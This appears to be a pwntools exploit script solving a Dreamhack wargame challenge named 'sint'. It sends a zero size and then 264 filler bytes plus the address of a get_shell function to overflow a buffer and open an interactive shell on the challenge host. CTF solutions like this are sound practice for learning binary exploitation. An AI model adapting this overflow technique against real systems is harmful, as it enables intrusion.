from pwn import *

context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./sint")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


elf = ELF("./sint")

get_shell = elf.symbols["get_shell"]
payload = b"A" * 264
payload += p32(get_shell)

size = 0
p.sendlineafter("Size: ", str(size))
p.sendafter("Data: ", payload)

p.interactive()
